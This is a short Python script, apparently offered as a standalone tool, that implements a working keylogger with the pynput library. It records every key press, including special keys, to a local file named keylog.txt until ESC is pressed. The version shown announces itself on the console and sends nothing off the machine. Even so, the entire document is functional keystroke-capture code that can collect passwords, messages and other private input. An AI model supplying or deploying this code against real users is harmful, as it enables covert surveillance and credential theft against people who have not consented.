from pynput import keyboard

# File where keystrokes will be logged
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            # Log regular keys
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (e.g., shift, ctrl)
        with open(log_file, "a") as f:
            f.write(f"[{key.name}]")

def on_release(key):
    # Optional: stop logging on a specific key, e.g., ESC
    if key == keyboard.Key.esc:
        return False

# Start listening to keystrokes
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Logging keystrokes... Press ESC to stop.")
    listener.join()

print("Logging stopped. Check the 'keylog.txt' file.")
